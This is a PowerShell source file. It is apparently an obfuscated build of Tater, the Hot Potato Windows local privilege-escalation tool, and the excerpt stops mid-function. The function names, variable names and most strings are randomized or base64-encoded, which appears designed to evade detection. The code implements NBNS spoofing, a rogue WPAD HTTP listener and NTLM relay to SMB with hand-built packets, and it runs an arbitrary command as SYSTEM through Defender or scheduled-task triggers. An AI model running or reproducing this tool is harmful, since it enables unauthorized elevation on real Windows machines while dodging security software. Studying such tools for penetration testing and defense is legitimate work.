function Invoke-T1
{
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNSLimit="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ExhaustUDP="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleOutput="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$TaskDelete="Y",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool="0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_ })][String]$IP="",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_ })][String]$SpooferIP="127.0.0.1",
    [parameter(Mandatory=$false)][Int]$HTTPPort="80",
    [parameter(Mandatory=$false)][Int]$RunTime="",
    [parameter(Mandatory=$false)][ValidateSet(0,1,2)][Int]$Trigger="1",
    [parameter(Mandatory=$true)][String]$Command="",
    [parameter(Mandatory=$false)][String]$Hostname="WPAD",  
    [parameter(Mandatory=$false)][String]$Taskname="Tater",
    [parameter(Mandatory=$false)][String]$WPADPort="80",
    [parameter(Mandatory=$false)][Array]$WPADDirectHosts,
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)
if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}
if(!$IP)
{ 
    $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
}
if(!$Command)
{
    throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAbgAgAC0AQwBvAG0AbQBhAG4AZAAgAGkAZgAgAGUAbgBhAGIAbABpAG4AZwAgAC0AUwBNAEIAUgBlAGwAYQB5AA==')))
}
if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.running)
{
    throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBUAGEAdABlAHIAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAcgB1AG4AbgBpAG4AZwAsACAAdQBzAGUAIABTAHQAbwBwAC0AVABhAHQAZQByAA==')))
}
${global:0692fe0f3fb24e1eaab3d7ebe23d6789} = [HashTable]::Synchronized(@{})
${0692fe0f3fb24e1eaab3d7ebe23d6789}.running = $true
${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue = New-Object System.Collections.ArrayList
${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue = New-Object System.Collections.ArrayList
${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_input = $true
${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step = 0
${0692fe0f3fb24e1eaab3d7ebe23d6789}.trigger = $Trigger
if($StatusOutput -eq 'Y')
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_output = $true
}
else
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_output = $false
}
if($Tool -eq 1) 
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.tool = 1
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) 
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.tool = 2
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_input = $false
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.newline = "`n"
    $ConsoleOutput = "Y"
    $ShowHelp = "N"
}
else
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.tool = 0
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.newline = ""
}
if($Trigger -eq 2)
{
    $NBNS = 'N'
}
${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add("$(Get-Date -format 's') - Tater (Hot Potato Privilege Escalation) started") > $null
${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAASQBQACAAQQBkAGQAcgBlAHMAcwAgAD0AIAAkAEkAUAA=')))) > $null
if($HTTPPort -ne 80)
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAgAFAAbwByAHQAIAA9ACAAJABIAFQAVABQAFAAbwByAHQA')))) > $null
}
if($NBNS -eq 'Y')
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAG8AbwBmAGkAbgBnACAASABvAHMAdABuAGEAbQBlACAAPQAgACQASABvAHMAdABuAGEAbQBlAA==')))) > $null
    if($NBNSLimit -eq 'N')
    {
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwAgAEIAcgB1AHQAZQBmAG8AcgBjAGUAIABTAHAAbwBvAGYAZQByACAATABpAG0AaQB0AGkAbgBnACAARABpAHMAYQBiAGwAZQBkAA==')))) > $null
    }
}
else
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwAgAEIAcgB1AHQAZQBmAG8AcgBjAGUAIABTAHAAbwBvAGYAaQBuAGcAIABEAGkAcwBhAGIAbABlAGQA')))) > $null
}
if($SpooferIP -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAyADcALgAwAC4AMAAuADEA'))))
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwAgAFMAcABvAG8AZgBlAHIAIABJAFAAIABBAGQAZAByAGUAcwBzACAAPQAgACQAUwBwAG8AbwBmAGUAcgBJAFAA')))) > $null
}
if($WPADDirectHosts.Count -gt 0)
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAAgAEQAaQByAGUAYwB0ACAASABvAHMAdABzACAAPQAgAA=='))) + $WPADDirectHosts -join ",") > $null
}
if($WPADPort -ne 80)
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAAgAFAAbwByAHQAIAA9ACAAJABXAFAAQQBEAFAAbwByAHQA')))) > $null
}
if($ExhaustUDP -eq 'Y')
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBEAFAAIABQAG8AcgB0ACAARQB4AGgAYQB1AHMAdABpAG8AbgAgAEUAbgBhAGIAbABlAGQA')))) > $null
}
if($Trigger -eq 0)
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGwAYQB5ACAAVAByAGkAZwBnAGUAcgAgAEQAaQBzAGEAYgBsAGUAZAA=')))) > $null
}
elseif($Trigger -eq 1)
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAgAFQAcgBpAGcAZwBlAHIAIABFAG4AYQBiAGwAZQBkAA==')))) > $null
}
elseif($Trigger -eq 2)
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAAVAByAGkAZwBnAGUAcgAgAEUAbgBhAGIAbABlAGQA')))) > $null
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.taskname = $Taskname -replace " ","_"
    if($TaskDelete -eq 'Y')
    {
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAAUAByAGUAZgBpAHgAIAA9ACAAJABUAGEAcwBrAG4AYQBtAGUA')))) > $null
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAARABlAGwAZQB0AGkAbwBuACAARQBuAGEAYgBsAGUAZAA=')))) > $null
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_delete = $true
    }
    else
    {
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAAPQAgACQAVABhAHMAawBuAGEAbQBlAA==')))) > $null
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIABUAGEAcwBrACAARABlAGwAZQB0AGkAbwBuACAARABpAHMAYQBiAGwAZQBkAA==')))) > $null
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_delete = $false
    }
}
if($ConsoleOutput -eq 'Y')
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABFAG4AYQBiAGwAZQBkAA==')))) > $null
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_output = $true
}
else
{
    if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.tool -eq 1)
    {
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQAIABEAHUAZQAgAFQAbwAgAEUAeAB0AGUAcgBuAGEAbAAgAFQAbwBvAGwAIABTAGUAbABlAGMAdABpAG8AbgA=')))) > $null
    }
    else
    {
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQA')))) > $null
    }
}
if($RunTime -eq '1')
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABUAGkAbQBlACAAPQAgACQAUgB1AG4AVABpAG0AZQAgAE0AaQBuAHUAdABlAA==')))) > $null
}
elseif($RunTime -gt 1)
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABUAGkAbQBlACAAPQAgACQAUgB1AG4AVABpAG0AZQAgAE0AaQBuAHUAdABlAHMA')))) > $null
}
if($ShowHelp -eq 'Y')
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0AVABhAHQAZQByACAAdABvACAAcwB0AG8AcAAgAFQAYQB0AGUAcgAgAGUAYQByAGwAeQA=')))) > $null
    if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_output)
    {
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAtAE4AbwB1AG4AIABUAGEAdABlAHIAKgAgAHQAbwAgAHMAaABvAHcAIABhAHYAYQBpAGwAYQBiAGwAZQAgAGYAdQBuAGMAdABpAG8AbgBzAA==')))) > $null
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAcwBzACAAYQBuAHkAIABrAGUAeQAgAHQAbwAgAHMAdABvAHAAIAByAGUAYQBsACAAdABpAG0AZQAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA=')))) > $null
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Add("") > $null
    }
}
if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_output)
{
    while(${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.Count -gt 0)
    {
        write-output(${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue[0] + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.newline)
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.status_queue.RemoveRange(0,1)
    }
}
${619ef0a8913848388e791387cf4dd3df} = [System.Diagnostics.Process]::GetCurrentProcess() | select -expand id
${619ef0a8913848388e791387cf4dd3df} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${619ef0a8913848388e791387cf4dd3df}))
${619ef0a8913848388e791387cf4dd3df} = ${619ef0a8913848388e791387cf4dd3df} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
[Byte[]] ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes = ${619ef0a8913848388e791387cf4dd3df}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
${6a6b2c0df5ea4faabcfb12b0bd430006} =
{
    function e4d2a1c6425b46fd910b818fb7433f18
    {
        param ([Int]${c11ddf873cca4833b687dd46e48bb2d9},[Byte[]]${a09b3d865f1d40389205c0d537fedaf0})
        ${e442b9d91c1345dbaf127021c93e3dca} = [System.BitConverter]::ToInt16(${a09b3d865f1d40389205c0d537fedaf0}[${c11ddf873cca4833b687dd46e48bb2d9}..(${c11ddf873cca4833b687dd46e48bb2d9} + 1)],0)
        return ${e442b9d91c1345dbaf127021c93e3dca}
    }
    function e9d05119cba84ff1affb6dd8f3f666b8
    {
        param ([Int]${e442b9d91c1345dbaf127021c93e3dca},[Int]${c1c1b7ee0231496690691fc469cb8213},[Int]${da4c4b3aede14842ac22ea873c6f6451},[Int]${ddd5772d1a0340dcb9d3bca3a166beaa},[Byte[]]${a09b3d865f1d40389205c0d537fedaf0})
        ${557dd080aa354bfe9fa5afb209ca2682} = [System.BitConverter]::ToString(${a09b3d865f1d40389205c0d537fedaf0}[(${ddd5772d1a0340dcb9d3bca3a166beaa} + ${c1c1b7ee0231496690691fc469cb8213} + ${da4c4b3aede14842ac22ea873c6f6451})..(${ddd5772d1a0340dcb9d3bca3a166beaa} + ${e442b9d91c1345dbaf127021c93e3dca} + ${c1c1b7ee0231496690691fc469cb8213} + ${da4c4b3aede14842ac22ea873c6f6451} - 1)])
        ${557dd080aa354bfe9fa5afb209ca2682} = ${557dd080aa354bfe9fa5afb209ca2682} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${557dd080aa354bfe9fa5afb209ca2682} = ${557dd080aa354bfe9fa5afb209ca2682}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${81445f8969fa4f95a0805837d22fed53} = New-Object System.String (${557dd080aa354bfe9fa5afb209ca2682},0,${557dd080aa354bfe9fa5afb209ca2682}.Length)
        return ${81445f8969fa4f95a0805837d22fed53}
    }
    function a988fe4bed3744049e217fd2b9e7e3e0
    {
        ${6e45c81b389e4d9e80da47201f61e02c} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAZABuAHMAYQBwAGkALgBkAGwAbAAiACwAIABFAG4AdAByAHkAUABvAGkAbgB0AD0AIgBEAG4AcwBGAGwAdQBzAGgAUgBlAHMAbwBsAHYAZQByAEMAYQBjAGgAZQAiACkAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABVAEkAbgB0ADMAMgAgAEQAbgBzAEYAbAB1AHMAaABSAGUAcwBvAGwAdgBlAHIAQwBhAGMAaABlACgAKQA7AA0ACgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAHYAbwBpAGQAIABGAGwAdQBzAGgAUgBlAHMAbwBsAHYAZQByAEMAYQBjAGgAZQAoACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVQBJAG4AdAAzADIAIAByAGUAcwB1AGwAdAAgAD0AIABEAG4AcwBGAGwAdQBzAGgAUgBlAHMAbwBsAHYAZQByAEMAYQBjAGgAZQAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQA=')))
        Add-Type -MemberDefinition ${6e45c81b389e4d9e80da47201f61e02c} -Namespace DNSAPI -Name Flush -UsingNamespace System.Collections,System.ComponentModel
        [DNSAPI.Flush]::FlushResolverCache()
    }
    function bab42ea23cbf4b21a92a6b346d944321
    {
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Stopping HTTP listener")
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Close()
        start-sleep -s 1
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener.server.blocking = $false
        sleep -s 1
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener.server.Close()
        sleep -s 1
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener.Stop()
        if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMBRelay_success)
        {
            if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.trigger -eq 2)
            {
                if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_delete -and ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_added)
                {
                    ${9e62886c60fe4e379b95b800f50f01f7} = $false
                    ${82db970eb7e94013af71158b6e35df0e} = new-object -com($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAC4AUwBlAHIAdgBpAGMAZQA='))))
                    ${82db970eb7e94013af71158b6e35df0e}.Connect()
                    ${1d9b2115f42a4fee8295b5cb637bc759} = ${82db970eb7e94013af71158b6e35df0e}.GetFolder("\")
                    ${1945a4b3ca804de2883afb4c520494a9} = ${1d9b2115f42a4fee8295b5cb637bc759}.GetTasks(1)
                    foreach(${ad4dae71ab004b14b3d66ee7917dca84} in ${1945a4b3ca804de2883afb4c520494a9})
                    {
                        if(${ad4dae71ab004b14b3d66ee7917dca84}.name -eq ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task)
                        {
                            ${1d9b2115f42a4fee8295b5cb637bc759}.DeleteTask(${ad4dae71ab004b14b3d66ee7917dca84}.name,0)
                        }
                    }
                    foreach(${ad4dae71ab004b14b3d66ee7917dca84} in ${1945a4b3ca804de2883afb4c520494a9})
                    {
                        if(${ad4dae71ab004b14b3d66ee7917dca84}.name -eq ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task)
                        {
                            ${9e62886c60fe4e379b95b800f50f01f7} = $true
                        }
                    }
                    if(${9e62886c60fe4e379b95b800f50f01f7})
                    {
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Scheduled task " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABkAGUAbABlAHQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkA')))) 
                    }
                    else
                    {
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Scheduled task " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABkAGUAbABlAHQAaQBvAG4AIABmAGEAaQBsAGUAZAAsACAAcgBlAG0AbwB2AGUAIABtAGEAbgB1AGEAbABsAHkA'))))
                    }
                }
                elseif(${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_added)
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Remove scheduled task " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABtAGEAbgB1AGEAbABsAHkAIAB3AGgAZQBuACAAZgBpAG4AaQBzAGgAZQBkAA=='))))
                }
            }
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Tater was successful and has exited")
        }
        else
        {
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Tater was not successful and has exited")
        }
        sleep -s 1 
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.running = $false
    }
}
${2bb5d972bc86421abb8c77ce87a991b1} =
{
    function a567d2bbb16849b98af24108e0faf73d
    {
        param ([Byte[]]${e06b869da0a54d77ab9ce73986621655})
        ${c6e088bb420d43ff8fdd341b0ac62406} = [System.BitConverter]::ToString(${e06b869da0a54d77ab9ce73986621655})
        ${c6e088bb420d43ff8fdd341b0ac62406} = ${c6e088bb420d43ff8fdd341b0ac62406} -replace "-",""
        ${6f629c1052b1468fb2d6e37d47f8ef3f} = ${c6e088bb420d43ff8fdd341b0ac62406}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
        if(${c6e088bb420d43ff8fdd341b0ac62406}.SubString((${6f629c1052b1468fb2d6e37d47f8ef3f} + 16),8) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAyADAAMAAwADAAMAAwAA=='))))
        {
            ${f78220a4f00b411f804d5d237d582aeb} = ${c6e088bb420d43ff8fdd341b0ac62406}.SubString((${6f629c1052b1468fb2d6e37d47f8ef3f} + 48),16)
        }
        return ${f78220a4f00b411f804d5d237d582aeb}
    }
}
${67e7d44a62184c85b8e9c128a6f153ed} =
{
    function ee786c187dbe4af7b0139692d11b7e60
    {
        param (${c47b7e6f72f84caa846eae38219512af},${c4394dc631b049e599bb2eddbecb2fdc})
        if (${c47b7e6f72f84caa846eae38219512af})
        {
            ${dcc059afcce34cb589a4c1c64a8f3a0a} = ${c47b7e6f72f84caa846eae38219512af}.GetStream()
        }
        ${baa18cccd8024b218f9dd81c0d0e3004} = New-Object System.Byte[] 1024
        ${dd148159f9eb4d67b97dbc112be968aa} = 0
        :SMB_relay_challenge_loop while (${dd148159f9eb4d67b97dbc112be968aa} -lt 2)
        {
            switch (${dd148159f9eb4d67b97dbc112be968aa})
            {
                0
                {
                    ${56b9e41047da4591a31b6458e602e3f4} = 0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,
                                                0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0xff,0xff +
                                                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,
                                                0x20,0x30,0x2e,0x31,0x32,0x00
                }
                1
                { 
                    ${609383709906436d8548f7db689baa28} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${c4394dc631b049e599bb2eddbecb2fdc}.Length))
                    ${609383709906436d8548f7db689baa28} = ${609383709906436d8548f7db689baa28} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
                    ${609383709906436d8548f7db689baa28} = ${609383709906436d8548f7db689baa28}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                    ${e9298dcb5b5643af8ff9bfd3f7c902b7} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${c4394dc631b049e599bb2eddbecb2fdc}.Length + 28))
                    ${e9298dcb5b5643af8ff9bfd3f7c902b7} = ${e9298dcb5b5643af8ff9bfd3f7c902b7} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
                    ${e9298dcb5b5643af8ff9bfd3f7c902b7} = ${e9298dcb5b5643af8ff9bfd3f7c902b7}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                    ${123670e95dd5433ba0d22477e03b613e} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${c4394dc631b049e599bb2eddbecb2fdc}.Length + 87))
                    ${123670e95dd5433ba0d22477e03b613e} = ${123670e95dd5433ba0d22477e03b613e} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
                    ${123670e95dd5433ba0d22477e03b613e} = ${123670e95dd5433ba0d22477e03b613e}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                    [Array]::Reverse(${123670e95dd5433ba0d22477e03b613e})
                    ${56b9e41047da4591a31b6458e602e3f4} = 0x00,0x00 +
                                                ${123670e95dd5433ba0d22477e03b613e} +
                                                0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x03,0xc8,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
                                                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,
                                                0x01,0x00,0x00,0x00,0x00,0x00 +
                                                ${609383709906436d8548f7db689baa28} +
                                                0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
                                                ${e9298dcb5b5643af8ff9bfd3f7c902b7} +
                                                ${c4394dc631b049e599bb2eddbecb2fdc} +
                                                0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,
                                                0x00,0x00,0x00,0x6a,0x00,0x43,0x00,0x49,0x00,0x46,0x00,0x53,0x00,
                                                0x00,0x00
                }
            }
            ${dcc059afcce34cb589a4c1c64a8f3a0a}.Write(${56b9e41047da4591a31b6458e602e3f4},0,${56b9e41047da4591a31b6458e602e3f4}.Length)
            ${dcc059afcce34cb589a4c1c64a8f3a0a}.Flush()
            ${dcc059afcce34cb589a4c1c64a8f3a0a}.Read(${baa18cccd8024b218f9dd81c0d0e3004},0,${baa18cccd8024b218f9dd81c0d0e3004}.Length)
            ${dd148159f9eb4d67b97dbc112be968aa}++
        }
        return ${baa18cccd8024b218f9dd81c0d0e3004}
    }
}
${1c6cda8c35274d56928c4b71be9229b6} =
{
    function c8f266b73c21452e94ce336d0337db39
    {
        param (${c47b7e6f72f84caa846eae38219512af},${c4394dc631b049e599bb2eddbecb2fdc},${d4fc511a0ea649629576cc7af60e82cd})
        ${ec9e722b7a1f4dc5b05746dcb551ea3b} = New-Object System.Byte[] 1024
        if (${c47b7e6f72f84caa846eae38219512af})
        {
            ${d9c02276587a41a7814a4ddf79c8e893} = ${c47b7e6f72f84caa846eae38219512af}.GetStream()
        }
        ${609383709906436d8548f7db689baa28} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${c4394dc631b049e599bb2eddbecb2fdc}.Length))
        ${609383709906436d8548f7db689baa28} = ${609383709906436d8548f7db689baa28} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${609383709906436d8548f7db689baa28} = ${609383709906436d8548f7db689baa28}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${e9298dcb5b5643af8ff9bfd3f7c902b7} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${c4394dc631b049e599bb2eddbecb2fdc}.Length + 28))
        ${e9298dcb5b5643af8ff9bfd3f7c902b7} = ${e9298dcb5b5643af8ff9bfd3f7c902b7} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
        ${e9298dcb5b5643af8ff9bfd3f7c902b7} = ${e9298dcb5b5643af8ff9bfd3f7c902b7}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${123670e95dd5433ba0d22477e03b613e} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${c4394dc631b049e599bb2eddbecb2fdc}.Length + 88))
        ${123670e95dd5433ba0d22477e03b613e} = ${123670e95dd5433ba0d22477e03b613e} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
